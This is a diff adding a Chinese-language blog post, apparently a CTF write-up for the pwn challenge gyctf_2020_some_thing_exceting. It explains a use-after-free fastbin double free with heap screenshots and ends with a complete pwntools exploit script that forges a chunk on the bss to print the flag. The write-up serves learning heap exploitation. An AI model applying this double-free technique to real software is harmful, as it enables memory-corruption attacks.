@@ -206,6 +206,88 @@
             
 
   
+    <article id="post-gyctf_2020_some_thing_exceting" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><h4 id="有点奇怪的UAF题，double-free-有点奇怪"><a href="#有点奇怪的UAF题，double-free-有点奇怪" class="headerlink" title="有点奇怪的UAF题，double free 有点奇怪"></a>有点奇怪的UAF题，double free 有点奇怪</h4><h4 id="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"><a href="#做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来" class="headerlink" title="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"></a>做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来</h4><p><img src="https://i.imgs.ovh/2023/10/16/rORK5.png" alt="image-20231016195506227"></p>
+<h4 id="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"><a href="#flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8" class="headerlink" title="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"></a>flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOQlA.png" alt="image-20231016195328962"></p>
+<h4 id="除了没有edit函数，其他都有"><a href="#除了没有edit函数，其他都有" class="headerlink" title="除了没有edit函数，其他都有"></a>除了没有edit函数，其他都有</h4><h4 id="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"><a href="#add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。" class="headerlink" title="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"></a>add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOuOD.png" alt="image-20231016194828854"></p>
+<h4 id="show函数，将两个地址的内容都打印出来，后期是用来打印flag"><a href="#show函数，将两个地址的内容都打印出来，后期是用来打印flag" class="headerlink" title="show函数，将两个地址的内容都打印出来，后期是用来打印flag"></a>show函数，将两个地址的内容都打印出来，后期是用来打印flag</h4><p><img src="https://i.imgs.ovh/2023/10/16/rO7Eo.png" alt="image-20231016195158667"></p>
+<h4 id="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free"><a href="#dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free" class="headerlink" title="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free"></a>dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOt0U.png" alt="image-20231016195828924"></p>
+<h4 id="漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次"><a href="#漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次" class="headerlink" title="漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次"></a>漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss=<span class="number">0x6020a8</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;NNNN&#x27;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;AAAA&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;BBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgs.ovh/2023/10/16/ruHnp.png" alt="image-20231016161307844"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruMbT.png" alt="image-20231016161325105"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"><a href="#这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零" class="headerlink" title="这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零"></a>这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零</h4><p><img src="https://i.imgs.ovh/2023/10/16/rup5u.png" alt="image-20231016161832970"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruuyO.png" alt="image-20231016162207401"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>) <span class="comment">#double free</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"><a href="#这里的话是double-free-，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等" class="headerlink" title="这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等"></a>这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等</h4><p><img src="https://i.imgs.ovh/2023/10/16/ru4mt.png" alt="image-20231016163943852"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruzIU.png" alt="image-20231016162508547"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x40,p64(bss),0x40,&#x27;AAAA&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"><a href="#再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址" class="headerlink" title="再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址"></a>再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址</h4><p><img src="https://i.imgs.ovh/2023/10/16/rujCC.png" alt="image-20231016163754041"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ru5cm.png" alt="image-20231016164225408"></p>
+<h4 id="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"><a href="#再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址" class="headerlink" title="再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址"></a>再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;kkkk&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.imgs.ovh/2023/10/16/ruv62.png" alt="image-20231016164831150"></p>
+<p><img src="https://i.imgs.ovh/2023/10/16/ruycj.png" alt="image-20231016164848340"></p>
+<h4 id="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"><a href="#再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc-0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。" class="headerlink" title="再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。"></a>再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"><a href="#想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。" class="headerlink" title="想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。"></a>想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。</h4><p><img src="https://i.imgs.ovh/2023/10/16/r7XdW.png" alt="image-20231016170214324"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,26884)</span></span><br><span class="line">p=process(<span class="string">&quot;./gyctf_2020_some_thing_exceting&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./gyctf_2020_some_thing_exceting&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size1,content1,size2,content2</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Now please tell me what you want to do :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; ba&#x27;s length : &quot;</span>,<span class="built_in">str</span>(size1))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; ba : &#x27;</span>,content1)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; na&#x27;s length : &quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; na : &#x27;</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Now please tell me what you want to do :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Banana ID :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Now please tell me what you want to do :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; Banana ID : &gt; SCP project ID : &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x6020a8</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;NNNN&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;AAAA&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;BBBB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(bss),<span class="number">0x50</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;MMMM&#x27;</span>,<span class="number">0x50</span>,<span class="string">&#x27;kkkk&#x27;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">b&#x27;1&#x27;</span>,<span class="number">0x60</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#dele(0)</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/10/16/gyctf_2020_some_thing_exceting/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-zctf_2016_note3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
